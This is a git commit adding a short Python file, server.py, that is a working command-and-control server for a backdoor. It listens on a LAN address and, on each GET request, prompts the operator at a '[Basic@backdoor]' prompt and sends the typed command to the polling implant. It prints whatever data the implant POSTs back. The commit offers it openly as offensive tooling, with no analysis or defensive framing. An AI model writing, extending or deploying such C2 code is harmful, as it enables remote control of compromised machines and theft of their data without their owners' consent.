755d89be9a9f773bce3b42bc19b455e7e58fd8ff
JJcoded <jjcoded.mail@gmail.com>
2024-10-25 12:24:15 +1000

    Add files via upload

---
+++ server.py
@@ -0,0 +1,28 @@
+import http.server, os
+
+HOST_NAME = "192.168.0.106" 
+PORT_NUMBER = 5000
+
+class HTTPHandler(http.server.BaseHTTPRequestHandler):
+    
+    def do_GET(self):
+        c2_command = input('[Basic@backdoor] ')
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        self.wfile.write(c2_command.encode())
+    
+    def do_POST(self):
+        self.send_response(200)
+        self.end_headers()
+        length = int(self.headers['Content-Length'])
+        PostData = self.rfile.read(length)
+        print(PostData.decode())
+
+if __name__ == '__main__':
+    server_class = http.server.HTTPServer
+    httpd = server_class((HOST_NAME, PORT_NUMBER), HTTPHandler)
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print('[-] Server Terminated')
